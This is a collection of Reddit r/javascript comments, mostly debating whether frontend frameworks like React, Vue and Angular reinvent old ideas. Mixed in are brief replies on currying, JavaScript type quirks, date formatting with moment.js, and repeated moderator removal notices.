People reinvent a lot of algorithms from the 60s and 70s to solve their problems now. The old days of web development were limited by browser differences and a lack of power. We are ever gaining more power and control as front end developers, which is what is allowing these old solutions to suddenly become practical. This is not unique. Pretty much every philosophical argument you care to think of was discovered, debated, and possibly abandoned as untenable hundreds of years ago, yet modern pop philosophers will write a book as if they were the first to discover some new principle.
I've used it before and it's a nice plugin. Good to hear they dropped jquery.
 Thank you for your interest in my modest contribution. The project is not yet complete but it is already stable and works perfectly. To reach version 1.0 I still want to bring certain improvements to the library and convert it into an NPM package. I will also create a Bundle for Symfony that can be installed via Composer and will bring the whole server part for push notifications. Be free to experiment, modify and improve this. I am open to receiving pull requests.
People have mixed opinions on Eric Elliott but his [blog post on currying](https://medium.com/javascript-scene/curry-and-function-composition-2c208d774983) helped my understanding a lot
&gt; All of the new tools, version upgrades, state patterns etc. felt like repackaged, rediscovered tech and theory They are. Just start ignoring them
Working hard on isomor [https://github.com/apiel/isomor](https://github.com/apiel/isomor) isomor is a library to create an interface between your backend and your frontend with nodejs and javascript application.
&gt; React didn't exist as a concept, for example. React is just a reimplementation of a much older library called `hyperscript`, actually
&gt; If you really want strict typing, use TypeScript. Doesn't vscode have some extension that basically enables type checking for JS?
This. People are re-inventing the wheel because it makes a better wheel. Many of the new libraries/tools that are coming out do serve the same purpose as existing solutions, and can produce practically the same results. But they're easier to use, have better optimizations, or take a different approach that's better suited to a certain set of problems. Imagine people stopped re-inventing cars after the Model T. The Model T could get you from point A to point B faster than walking, had a cabin area to protect you from the environment, extra space to carry things, headlights to drive at night, etc. It solves every problem you would need a car to solve. Does that mean todays re-inventions of the Model T don't have any value? Of course not. Todays cars are so unbelievably superior to the first cars that were invented. They didn't change much in the formula, they just slowly made incremental improvements to get to where cars are today. No reason to think the world of programming would be any different.
React is so much more than hyperscript. It's not "just a reimplementation". But even if it were true, hyperscript itself started in 2013, a relatively new idea as well.
I tend to agree with you. I also have the feeling that web development became more and more complicated. 10 years ago, implementing a website was pretty straight forward. You just had to deal with an ORM and a template engine, that's all. Today you have to handle so much thing it is is a nightmare, between react, webpack, graphql, the api, SSR for google and so on. Would be really great that the up coming tools/libraries will help us to solve all this overhead, tool like create-react-app or lerna. But there is such a gap that it will be so much work to uniform all of this stack...
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/laravel] [Turn your existing site into PWA with this JS library](https://www.reddit.com/r/laravel/comments/ble3om/turn_your_existing_site_into_pwa_with_this_js/) &amp;nbsp;*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))*
I‚Äôm able (and happy) to work with any new tech. That‚Äôs not the issue. My frustration comes from the lack of progress being made. Don‚Äôt get me wrong, the frontend is moving in the right direction (IMO). This movement just feels stifled by tribalism and reinvasion.
Coming from the ActionScript world myself I was somewhat disappointed at having to move "backwards" to JavaScript, especially in the state in which the languages were at about 5 years ago. However, ever since Adobe tossed in the towel on AS, JavaScript has made some wonderful advancements on the language front and these days I would say it's comparable to, and in some ways better, than ActionScript 3. Maybe AS4 would've been an amazing language but I doubt we'll ever know. &amp;#x200B; Beyond this, however, what you're describing are libraries and not the core language itself. While the ECMAScript standard continues to be developed, there are many ways to leverage it to get it to do what you want. I wouldn't call this "new old tech" as much as coding preferences and requirements. Maybe you prefer Angular, maybe Vue, maybe React ... or maybe you like to work closer to the core language; at the end of the day it depends on what your requirements and preferences are. If you need / want as much control over your rendering code as possible it's probably best that you hand-craft it instead of adopting someone else's code but if you want to create something quickly and fairly reliably then maybe one of the existing libraries is for you. &amp;#x200B; ActionScript had similar "problems" (if you want to look at it that way). You could simply work with the built-in DisplayObject hierarchy or you could use an external library like Starling Framework. In this case the promise was that Starling (and derived projects like Feathers), would render display objects much more quickly by leveraging the GPU but it came with some coding/learning overhead which maybe you wouldn't need ... depending on your project and preferences. Of course if you were really keen you could re-create Starling-like functionality and possibly even improve it but, again, that's quite situational. &amp;#x200B; On the other end, library writers have to deal with broad support (i.e. multiple browsers), and use-cases / applications so they necessarily have to bake in a bunch of overhead; in the end it *should* save you some coding time but at the expense of output code size and possibly performance. &amp;#x200B; I don't believe that there's a one-size-fits-all approach, even if it's simply a matter of personal preference, so the more libraries and frameworks there are out there the better, IMO. Yes, to a certain extent they are re-creating the wheel and it may be a waste of time / effort / resources that could be spent on other work, but I have yet to see "this is the one and only correct way ever to do X" functionality. &amp;#x200B; I should also add that it's probably better if developers don't have to fiddle with lower-level stuff like UI rendering if they don't have to so that they can concentrate on building useful and interesting apps on top. Just as with Flash / AIR, we coded on numerous layers of abstraction which were thought to be the absolute *best* way to do stuff (like vector-based animation), but additional options and technical improvements demonstrated that this wasn't always the case and not always the *desired* way besides. &amp;#x200B; Finally, if you want to push forward the state of front-end capabilities I say go for it! If there's something missing or lacking in the space then why not fill it? If it's truly innovative your work may even end up getting incorporated into the core VMs and as someone who cheers innovations I'd add my star to that Github repo :)
I procrastinate that's my problem
25 and 26 have a x that wasn't used
School still teaches html 4 and barely touches JavaScript vanilla
I‚Äôm not saying all frameworks are doing this. I love react. But to play devil‚Äôs advocate, early react was just the view. View templating has existed for quite sometime, either from backend frameworks or libs like underscore, mustache etc. I‚Äôm not calling out all frontend tech. But let‚Äôs take a look at the big three: React, Angular and Vue. Arguably, they all can solve the same problems. Months and years are spent by Angular devs to solve problems React has already solved. That last statement holds valid with any permutation of those names. I‚Äôm seeing a lot of duplication in frontend tech is all. Take these comments with a grain of salt.
Totally agree with this. There‚Äôs a dependency on frameworks that‚Äôs going on. I think it‚Äôs important that we teach the new wave of programmers the old way of doing things. It‚Äôs also important that we explain why things are done that way.
Lol, I was waiting for this. I didn‚Äôt mean for that statement to be taken literal. I‚Äôm thinking you grasped what I was going for though.
I‚Äôm 42 years old. Most of the guys I know who adopted that attitude are struggling in their careers. I‚Äôm not saying hop on every ride, but you can‚Äôt say ‚Äúyup this works‚Äù for the rest of your career or you‚Äôre guaranteed to stagnate.
Until universities/colleges go out of business, change will not happen... They teach absolutely nothing of value for all the money you put into them... This however is only for web dev, if you want to be doctor or say lawyer universities are good for that.
Recently had to modify a project I made about 8 years ago, one of my last AS3 project. To my biggest shame it was so beautiful, clean and concise... I feel like I've reverted back in skill since moving to Javascript and write shittier code. I was using flex and its display language (mxml) felt so much clearer than HTML, Types and interfaces made everything clear and felt solid. A genius library called RobotLegs was handling dependency injection and gave you a simple but great pattern to scale up your app as multiple features arrived. What is so embarrassing about it is today I don't think my code is as clean. I don't like Redux or Flux, I use Mobx but its still weird. CSS is fucking bunkers to me. I miss skin files :( So sad about asNext being dropped and how flex is just history of a great tech I might never find again.
I completely agree with you. That's why gave up programming.
‚Äú[T]hey‚Äôre killing decade old follies that brought about separation...‚Äù This is kind of my point though. The solutions already existed. Wrapping those solutions in a framework is great and leads to rapid development. However, how many times do we need to rewrap those solutions in each framework upgrade?
I don't feel frustrated. For everything I learn, I try to generalize and understand the model / approach / paradigm. I've done Angular, Vue, and React. While Angular _is_ a bit gnarly re: API surface area, I can basically jump between any of those 3 with little effort and basically no ramp up time. The principles of component-based architecture are mostly the same (state management stores, best practices, how to structure for peer understanding, etc.) I also eschew specializing technologies I perceive as "too early" or prone to high churn. For example, I hate focusing on or being tasked with working on JS build systems. I get the general principles and config of e.g. webpack, I can write and compose plugins, but I'd rather not.
I was hoping this was going to be about TC39.
What I noticed is lack of supported libraries, like how many date pickers can there be? 10, 20, 50? And all those new libs have their own react-date-picker, react-grid, vue-dialogs. Like come on... work on one library, have those multiple devs/larger community support it instead of abandoning it and rewriting and forking again and again. Just today I went through two libraries 3 forks deep abandoned/resurrected/abandoned/resurrected/abandoned.
\&gt;Why is the frontend community constantly reinventing the wheel to solve problems that have already been solved? This is not the case. Changes in tech come as people need improved tools to meet ever growing client demands and expectations of what the web can do. Front end changes far faster than any other dev specialty because the needs of a front end change rapidly. We are all problem solvers, and we build tools best suited to solve specific problems.
I'm reading lots of complaints with no suggestions here, OP
Higher-order-Components (HOC) are a concept of React and similiar libraries that use Components to build software, hence the name. The linked gist isn't about React at all, so no idea how you're thinking of HOCs. If you're thinking of Higher-order-Functions (HOF), then of course yes, by definition every curried function is a HOF, since you're passing a function as a parameter for another function to invoke later on. HOFs are a fundamental concept in everyday JS.
Same here, I feel frustrated too. Especially with all the new frameworks that come out daily. I would understand if they're being done for portfolio purposes because most of the problems they are trying to solve are either already solved or not existing. But nah alot of them try to sell themselves as something new which they aren't. I feel like that lots of stuff that gets released are like that. It's solutionism at it's worst.
we've already crossed the peak. it's all downhill from here on out, and the winner is whoever can take as many people to ride along with their bs
It does, and it was actually improved recently. But I don't know if it's quite as comprehensive as actually using TS.
Nothing bad in that.
But these frameworks allow you to write much simpler code. Coding in react, especially with typescript, feels a lot like Haskell where you're just writing small, usually pure, functions. State and all that madness is regulated into its own little boxes, and you just focus on "What return value does this simple function have for the given parameters?" as opposed to "what is the state of this application currently and how will my mutating that state effect the rest of the application?" Sure, functional programming existed long before react, but nobody had brought the concepts to javascript-land quite as elegantly as react has, most notably since they've started moving to the newer hooks api.
&gt; If you abhor rapid and regular change and self development, then steer far clear of web development. I don't really agree with that. The web is one of the platforms with the strongest backwards compatibility priorities and historically the areas where you *have to* change are governed by extremely slow moving and conservative standards bodies. You only have to change to the extent that you decide personally that its of a benefit to you. In contrast, non-web development can force a lot more change since it's often more unilateral and low level.
Yeah, my mistake. I did mean Higher Order Function.
#3 with `Symbol` seems out of place. It's used to create symbol instances which have a type of "symbol". And while true `Symbol` itself is a function, #4 has a similar title but with `Object` yet it uses an object instance and not `Object` itself, which like `Symbol`, is also a function. #7 "But a function created with the ‚Äònew‚Äô constructor has a type of ‚Äòobject‚Äô" Not always, for example `typeof new Function` #8 "Calling a function without parentheses () with return the contents of the function." You're not exactly calling it then. And its not returning so much the contents as it is a reference to the function itself. You see the contents in the console because thats what its `toString()` is showing you (at least in chrome, other environments will differ). const h = () =&gt; { console.log('hi Sunil') }; h.toString = () =&gt; 'foo' h; // foo #11 ...and a few others... ex: `const k = new String(‚ÄòSunil‚Äô)` Would be helpful if quotes were fixed so its working code (helpful for people copying and pasting to test the code for themselves) #16 - #19 are duplicates of #6 - #9 #20 (and #22) "Primitive values that are equal will always return true when compared with the triple equality operator" Except for symbols, but that's also why there is no literal form and instead they're created with a `Symbol()` #23 "Non-primitive values, such as arrays and objects, will not result in values that are not exactly equal" Triple negative? Objects can be equal, they just have to be the same object. const w = { name: "Sunil Sandhu" }; const x = w; w === x; // true #24 "However, if you compare the properties inside‚Ä¶" ... assuming the objects are comparable primitives, or references to the same object
React is actually quite a bit less than hyperscript, not more 2013 is six years ago. If you're calling that new, you're proving OP correct
I didn't say ignore everything. I said stop feeling obligated to catch everything. They're extremely different
Enh, not really. There are numerous prod-ready solutions to problems. I'm paid to take problems and solve them with tools. I do this. I go home and sit in a comfy chair. Then I do it again tomorrow. There will never be flying cars. Adjust your expectations and find some inner peace.
&gt; 7. But a function created with the ‚Äònew‚Äô constructor has a type of ‚Äòobject‚Äô You didn't create a function there &gt; 8. Calling a function without parentheses () with return the contents of the function. You didn't call that function &gt; 15. A variable can be assigned some arithmetic How is this confusing?
I have a I worked for some time called [named-curry](https://github.com/victorperin/named-curry). It probably need some performance improvements to be used in production, but it can help your code become more readable.
I suspect it‚Äôs less a battle over technology and more over standards. AC3 was cool, but it was also controlled entirely by what became Adobe. When Facebook added that clause to the react license agreement, the place I work immediately switched to Vue. React is cool, but monopolies on tech aren‚Äôt great for the actual development users. License fees suck (unless the product is innovative/valuable and the fees are reasonable). I have a feeling we‚Äôll soon have another Apple/Flash situation after Chromium gains too much control or when/if W3C loses all influence to WHATWG. Open, well-developed, well-negotiated standards will always be the most reliable, but they‚Äôll never be that exciting or progressive. TL;DR: if developers don‚Äôt want to get thrashed around by ownership/control politics, we‚Äôll have to stick with old, standard tech.
There are also more abstract things like community, developer support, policies on changes or security, the software license that is used, etc.
1. Good, hard, cold isolated shadow dom + (with) web components/custom elements across all browsers 2. Standardize a way of specifying a "style or theme" for web components/custom elements (no, not CSS, layout should be dictated by the component). 3. ES Modules in javascript standardized 4. First class authentication support (saml2/oauth2) directly in HTML or javascript 5. DOM Diffing built directly into browser via shadow DOM. 6. Ability describe complex objects in HTML attributes (this just seems to be something all frameworks find themselves needing when working in their transpired pseudo html variants). 7. Ability to describe a sub-property of a URI resource, e.g., be able to reference a users name in a JSON reference at [https://www.example.com/user/current#name/first](https://www.example.com/user/current#name/first). 8. Ability to take any URI reference and inject it as text into any content area in HTML, or if in a attribute a complex object (should it be one). 9. Do this without needing to transpile or build anything. For #7 and #8 it would make this possible for a displaying a users name: Hello, `&lt;span content-ref="`[`https://example.com/user/current#name/first"&gt;First`](https://example.com/user/current#name/first"&gt;First) `Name Placeholder&lt;/span&gt;`.
Fixed! https://codepen.io/anon/pen/ZNYyVX
What progress do you want to see?
Not only is it fucking stupid, it's FUCKING STUPID. (I know what I just said is stupid and I'm very stupid). The problem isn't just people who think they can reinvent the wheel better. It's that we're not making any standard tools everyone can fork and agree on. I don't know why we can't do things like the LLVM project. Have a bunch of big company agree on some kind of core and have frontends to it with a few of them being standard (ie one for SPA, another one for dates or parsing markdown, and etc). We need more projects like LLVM and we need some ppl doing it for the web
It makes it a little easier/cleaner if you have the `selectedDepartments` array as _just_ the values, instead of having an array of objects. You can either start with that, or just do a `map` (as I have below) to get those values. ``` const selectedDepartments = [ { key: 1 }, { key: 4 } ]; const selectedDeptNums = selectedDepartments.map( dept =&gt; dept.key ); const selectedUsers = users.filter( user =&gt; { return user.groups.some( group =&gt; { return selectedDeptNums.includes( group ); }); }); ```
&gt; React is actually quite a bit less than hyperscript, not more Elaborate? &gt; 2013 is six years ago. If you're calling that new, you're proving OP correct OP is talking about ideas that "have existed for ages in computer science" and that there "hasn‚Äôt been any major advancements in software for decades". So in that context 6 years is relatively new.
React (and Redux) builds a lot on reactive programming and takes quite some cues from functional programming, both of which has existed for decades. Maybe the specific combination of ideas that React uses didn't exist before, but every principle it builds on is pretty old. /u/impurefunction isn't saying that React is not cool, he's saying that the frontend world seems to forget it's heritage and our lack of intent to understand those who came before us makes all of us worse developers in the long run, since we spend a lot of time reinventing. And I kind of have to agree.
That's sort of like complaining that a restaurant serves both pizza and pasta because both serve the same purpose of getting you full and getting you nutrients. In the end, people, their context and the projects they work with all may need, prefer or tolerate different things.
&gt; React is actually quite a bit less than hyperscript Yes, because hyperscript provides a method for efficiently rendering, and managing state, and isolating sets of DOM nodes and behavior into components, and... Oh wait, it doesn't
Hi /u/_Artaxerxes, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
It's all voluntary. You take on dependencies that are worth the effort and still have the option to take on none if that way were truly better for your case.
Hi /u/rsaturns, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/ham-ar, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/nowboarding, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Sure but the natural progression of web development has moved from "simplish" template style websites to more robust on-demand fetching, animated, user friendly and interactive websites. Naturally with the latter coming into play more javascript-centric websites were necessary. I think we should blame all these ux designers for coming out with sexy designs forcing us to do all these complicated front-end things :P
The ideas behind React have been around for literal decades. They say as much when you see their prior art page. I actually kind of agree with OP. As much as I love React and javascript and the tooling that has been built around it it does sometimes feel like I'm relearning the same things over and over again just done in a slightly different way with a new API better suited to the domain. The actual underlying concepts haven't changed much though.
I felt that way about angular for a bit until I messed around with nativescript and am kind of liking this mentality - am I going down a bad path? I mean nativescript is kind of really easy right now imo and I might like it better than react native atm.
You can still just open your text editor and build the same kinds of websites you were building 10 years ago in the same way you were 10 years ago. We've moved on from that because the applications we're building are more complex. If you're overcomplicating your build process that's on you and your choices not the community or the tools that exist.
calling out an issue is perfectly valid even if you don't have an answer for it. where do people get this idea that you have to have a solution to a problem before you're allowed to talk about it?
Take a look at these two articles which seem to be closely related to what you describe: - https://lucasfcosta.com/2017/07/17/The-Ultimate-Guide-to-JavaScript-Fatigue.html - http://2ality.com/2016/02/js-fatigue-fatigue.html Good luck!
People take computer science expecting to learn programming. Computer Science is not programming. It will help you tremendously to _learn_ programming but in and of itself computer science will not make you hirable. It's not meant to. If people just want to learn straight programming they should avoid university and go to a boot camp but at a certain point they'll need to learn some computer science anyway if they want to remain competitive. Don't blame schools for something that you failed to understand / do.
I don't think the wheel is being reinvented at all. I think from the abundant major libraries and frameworks that we have seen over the past decade (Ember, Knockout, Backbone, Angular, React etc) we've seen a few emerge that many developers have had great success with. These have libraries or frameworks have been refined with time and now they're the major ones. When discussing frontend you really only hear three these days. Vue, React, Angular. Angular was heavily modified and simplified and as a result it stayed relevant. Admittedly there is some tribalism but I would think most mature developers believe in using the tool that is best for the job which is based on a lot of factors. How big is the project, what is the experience of the team, what works best for the business? Etc. I also wouldn't quite call these things new old tech per say, they solve some pretty unique issues that existed back in the dhtml and heavy jquery days. I would say that sometimes I feel overwhelmed, but for me that's part of the fun. Generally you get into programming with the expectation that you'll always be a student. Also I don't know how we are being held back by more libraries. The libraries that offer the better solutions will generally stick around and continue to be modified by the community. I mean sure one major library or framework to rule them all could be potentially better, but idk. Peoples minds work differently and that's why it's a good thing that we have different libraries and frameworks that ppl can choose that suit them better.
It really doesn't matter that x existed as a theory in computer science. Until it's actually applied in way that can scale and actually provide pragmatic value it's close to useless. That's what we are doing as engineers. We are hacking our way trying concepts. And battling ideas at each other. And implementation of those ideas. That's how progress is being done. Front-end is really consistent with it's direction. And the reason why so many people feel "fatigue" is that it's improving at extremely fast pace. Mainly due to this segregation, mainly due to this battle of ideas, trials and errors. So no. I think client side programming is at it's best as we have it now.
Additionally on that the communities around these products and their accessibility to add-on library support goes a long way. If something can be integrated into or added onto with ease then it might be better than a similar solution that doesn't have the same features. Using the wheel metaphor, if it can't take a new rim/spoke setup or is finite in its configuration then its going to be less adaptable for many other situations. Use case is important in the larger scope of things.
Seems like you don't know what hyperscript is, friend
&gt; OP is talking about ideas that "have existed for ages in computer science" and almost everyone in this sub has been programming for less time than this library (which is actually quite a bit older than six years) has been around. domenic tarr's 2012 implementation is not his first. that's almost 10% of the total length of the entire field, besides . &gt; So in that context 6 years is relatively new. disagree.
Uhhhh... it's a meme reference: https://knowyourmeme.com/memes/slaps-roof-of-car (Considering the tools inside it are generally used to ensure code cleanliness)
Stupid question but does this work with any site? Plain html and wordpress?
Love seeing founders being transparent about the ups and down of building a company - added bonus that it all started as a side project. Great story!
Yes. Now it cant be a web page its an ‚Äúapp‚Äù which means you have to emulate the browser inside the browser, dawg
I‚Äôm quite enjoying the plateau TBH. Couple of years ago everything was new! I do also think that the funny thing with innovation is that its 1) not always predictable &amp; 2) not always massively obvious.... its usually tiny increments.
Its simple. Reinvent to make buzz around something. This is highy profitable for companies, not always in pure dollars, but in motivated and highly skilled employees. There has been very little actual progress in the web scene since the first mvc/mvvm libraries came out in circa 2005-2008 era. Now we have React, Angular and Vue. Its the same stuff we had back 10 years ago, just with a new twist, but one can ask if there is really anything revolutionary? Before you say it, yes a VDOM could and did exist pre react, state management was always as hard, and today like in 2005 global mutable state was bad. Theres only new iterations of the same old stuff. New APIs and new glitter. That said, im quite happy for all this. You can always pick up something new and never get bored. React and angular will be mostly forgotten in 2030, like javascriptmvc is today. Who knows what we will have then...
Ohh... I got wooshed, lmao. I know the meme, just the cleaning part went over my head.
`timestamps.map(timestamp =&gt; moment(timestamp).format(''));` Insert the format you want to use.
This wasn't the point i was trying to make. These things were causing separation, hence they go away now. Templates are near dead, we have a platform neutral dsl now. OOP is near dead in favour of functions. Lifecycle components, the thing that makes frameworks facing the user so different, are gone after hooks. What lead to rapid development was removing these barriers. We've had native platforms spend 20 years and longer with some of these old paradigms, unable to cross their own specifics.
I feel you - I‚Äôm not so frustrated about the ‚Äúrediscovery‚Äù part as the tools and neophilia parts though. It feels like there are tools announced daily that solves problem X but also creates problems Y and Z. For example, we have all these cool tools now like Webpack and ES6 transpilers, but they also create whole new classes of problems.
that's really cool! does the color change based on pitch or is it just random?
[I do](https://github.com/hyperhype/hyperscript). It's basically syntax sugar for creating an HTMLElement. That doesn't mean it's bad, it's purpose just isn't the same as react
Thank you! I have predefined color schemes but yeah, they're random. I stole them from the first visualizer I made for Spotify.
There's a lot of this on Hacker News (where a lot of older developers hang out). Every time something new comes out, there's comment like, "Pff, this is just &lt;idea that existed 50 years ago&gt; !"
To answer why: because nobody found a way to put a square peg (apps) into a round hole (web). This all driven by a mistaken idea that eventually everything should be a web app. And done with the web tech (html, js, css). And of course it does not work. But instead of rethinking the core assumption mindless hordes try again and again. Where this aversion to other tech/languages comes from I have no idea, but this too adds to reinventing the wheel.
yes
FunFunFunction has a video on currying.
Voluntary if you own the project or own the decision on what to use, perhaps. Most companies throw in layers of stuff on top of other layers of stuff, just to "attract talent" and use buzzwords like GraphQL &amp; Co. And you don't have much choice, if you decide that you're not into that you're pretty much out (or left with a small subset of the market opportunities).
Hi /u/sundogbillionaire, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/smudgepost, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/RextTheGreat, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Thank you for this! I am already mapping other stuff it never occurred to me that I could put a function into it! I'll give it whirl this evening, thanks :)
That doesn't really have anything to do with JavaScript or frameworks though. Any technological landscape can be mismanaged by a company you work for.
I think the churn of 'new' old ideas is a good thing. Things like immutability and general functional programming have been around for decades, fallen out of fashion in favour of new paradigms and then come back again once the new paradigm starts to show its flaws, hopefully resulting in a hybrid that's the best of both. It is evolution, almost literally. However, tribalism is always a bad thing. Whenever someone says X is better than Y it's almost always an opinion not worth listening to. All languages and frameworks have their benefits to certain people and they can all learn from each other, whether it be from their successes or their mistakes.
I just had a massive chicken madras and read this while sat on the loo, I believe that is currying
I see it less as duplication and more as creativity. Now Mithril, Preact, and React? Okay there is some overlap it they still tackle different use cases OOTB or are more performant (trading off for up-to-date feature support than the other libraries.
I'm really liking Vue, haven't given react a real shot yet because Vue seems so straight forward.
Nobody ever chose Angular for a project because of trends, because trends can't inform you if you know more than the people setting them.
NS solves a different problem than what Angular is attempting to solve and they are not mutually exclusive.
Also, specifically in the context of software, there has been a lot of change in the demands placed on software. The hardware has improved, the people expect faster/better/prettier products... All of those things heavily influence the direction of the industry. If you asked someone 15 years ago if we would be building single-page web apps with almost pure JavaScript, they would have laughed. Things have changed. &amp;#x200B; Along with that came a few paradigm shifts as well. JS is a VERY powerful language. You can write code in an imperative, OOP, or FP style if you want to. It's so *relaxed* about it's rules and structure that it becomes really hard to write large applications with any sensible, disciplined structure. Therefore, the most underrated benefit of all these frameworks &amp; libraries is that they enforce discipline. You must conform to some opinionated API because those library authors honed in on a *reliable* pattern for solving that specific problem. And that super difficult to accomplish on your own, especially in JS.
Yeah but tbh CSS is only like that if ur not properly familiar with it, having written CSS for years and years I find things like styled components absolutely enraging. So much JavaScript bloat
I'm giving up on programming altogether after 25 years.
I came for some boring front end beef but went with new found hope.
While I‚Äôm waiting for my docker build to complete here are a few thoughts: 1. Make sure we put in the due diligence and understand the libraries and frameworks we‚Äôre using (and what we‚Äôre building really). This can be as simple as reading the docs to an in-depth source code review. What does this solve? You will gain knowledge on what the framework does and how it does it. Learning is the key here. Share what you‚Äôve learned with your team and community. This will lead to less redundant questions on stackoverflow and less answers to those questions on npm. 2. Quit defending frameworks like they‚Äôre sports teams. We‚Äôre creating ecosystems because we want don‚Äôt want to leave our comfort zones. We spin our wheels learning new tools rather than using that effort toward teaching, sharing and pursuing new ideas. We also (sometimes) create new tools because we want to do it better. This is not a competition, this is engineering. We need to contribute more (myself included.) 3. Push back. If we see new old tech in a blog post, as a new feature in a planned release, tastefully respond. ‚ÄúFramework x approaches this in this way.‚Äù What we want to relieve is having to wait for/request feature because your framework of choice doesn‚Äôt support whatever it is that you‚Äôre wanting to do. We want to reduce our dependencies. 4. If we do release a new lib or framework, make it smaller, reusable and modular. This is a big one. If all I want is the view, why do I need all of this other functionality? Bootstrap does a good job of this with its package configurator. The further adoption of web components will solve some of these issues. The original post wasn‚Äôt meant throw anyone under the bus. The intention was to get us all talking and thinking about the future of frontend development. This response was kind of rush, but hopefully you get the jist?
I think it has very much to do with JavaScript's landscape itself (at least in my opinion). What much choice to you have in .NET? Or Java? There are a couple of well known standards when it comes to libraries and that's about it. I have barely seen anything besides WebAPI or Spring Framework (or Springboot) in those fields. How about NodeJS then? Is it Express? Maybe Hapi? Or Koa. Perhaps we can go with Restify instead! Same goes for FE frameworks (though I must admit I am glad to see that React is indeed becoming a standard, not that I think that it's so great compared to other frameworks, but at least there could be a chance for standardisation).
in javascript it's a partial application technique that's great for writing blog posts about but not much else
That's partly because .NET and Java have substantial portions of their community not even touching the web, so the areas where "too many ways to do X" comes up are different. But, I mean you even see it in the mere choice of which language to use. Many different languages that all work exist. Many are largely similar. And more keep getting made. Excess choice is all over the place.
And it should a bit, they made some bad decisions along the way.
This is basically my philosophy: ignore everything for at least 18 months. If its still around, learn about it. If it's solving problems in a novel and useful way, or has completely overrun the community, consider using it. The trick is to know what the new stuff is so as to not appear like a total bumpkin. I managed to skip over gulp entirely going from grunt to web pack. Yarn just doesn't seem useful to me, though I know what it looks like. React hooks? Gtfoutta here, I'll be back in a year. Rollup? Awesome, give it to me. Webpack? Yes please. I'll start watching talks on graphql soon.
I want to learn from you in this matter. You said "most". Could you give some insight into the ones that did not stagnate in spite of ignoring ? And those that "embraced" whatever change was hot, what did they build compared to the other counter part? What are some current objective differences between the products that got out from the hands of both parties? I'm 32, and can afford to not be anonymous and have some skin in the game. With 20+ yrs experience into the industry, I'm sure you can do the same and give some concrete examples with links.
Okay so this worked perfectly for me, thank you so much!! To anyone else new to this, I worked out I needed to multiply my epoch by 1000 prior to mapping with moment() in order to get the correct time as JS works in millis. &amp;#x200B; Thanks again, you have saved me so much time, and helped me learn something! :)
I was probably too vague in my post. I agree with your points. JS is still the wild-west, but when I see a crowd of 2k applauding drag-and-drop in the Angular cdk, I cant help but feel frustration. I‚Äôm not angry, I love this community. I just don‚Äôt think preference is a good enough excuse to solve problems that already have viable solutions. I think we need to make a list of features that ECMAScript doesn‚Äôt support and start pushing those proposals forward. We‚Äôre on the same team!
I think money has a lot to do with it. New frameworks require new books, conferences, training materials and applications needing to be rewritten. At some point there will come a time when HTML, CSS and JavaScript are no longer the core of web applications and we will have to relearn everything all over yet again.
cool
With this being MIT licensed, I can only hope vuejs support follows in future
Also the idea that not every company has to be a billion dollar unicorn to be successful. There's a lot of value in small 2-5 person shops working on niche products
